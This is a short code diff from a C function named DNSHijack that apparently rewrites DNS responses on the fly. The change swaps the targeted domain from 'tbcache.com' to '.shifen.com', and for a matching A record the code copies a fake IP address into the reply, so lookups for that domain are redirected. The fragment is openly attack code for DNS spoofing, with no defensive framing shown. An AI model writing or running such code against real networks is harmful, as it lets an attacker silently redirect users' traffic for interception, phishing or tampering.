@@ -96,7 +96,7 @@ int DNSHijack(u_char *buf) {
 
         if (type == DNS_A) {
             bzero(ip , sizeof(ip));
-            if (data_len == 4 && strstr(aname, "tbcache.com") != NULL) {
+            if (data_len == 4 && strstr(aname, ".shifen.com") != NULL) {
                 memcpy(p, fake_ip, 4);
                 memcpy(netip, p, data_len);
                 inet_ntop(AF_INET, netip, ip, sizeof(struct sockaddr));
